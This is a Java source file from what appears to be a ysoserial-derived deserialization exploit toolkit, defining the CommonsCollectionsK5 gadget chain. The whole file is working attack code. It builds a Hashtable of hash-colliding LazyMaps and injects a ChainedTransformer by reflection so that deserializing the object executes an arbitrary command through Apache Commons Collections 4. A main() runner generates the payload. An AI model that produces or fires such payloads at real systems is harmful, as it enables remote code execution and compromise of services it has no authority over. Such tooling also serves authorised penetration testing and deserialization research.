package org.su18.ysuserial.payloads.gadgets;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.Transformer4Util;
import org.su18.ysuserial.payloads.util.TransformerUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:4.0"})
@Authors({Authors.QI4L})
public class CommonsCollectionsK5 implements ObjectPayload<Hashtable> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK5.class, args);
    }

    public Hashtable getObject(String command) throws Exception {

        final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers     = (Transformer[]) Transformer4Util.makeTransformer(command);
        Map                 innerMap1        = new HashMap();
        Map                 innerMap2        = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }
}
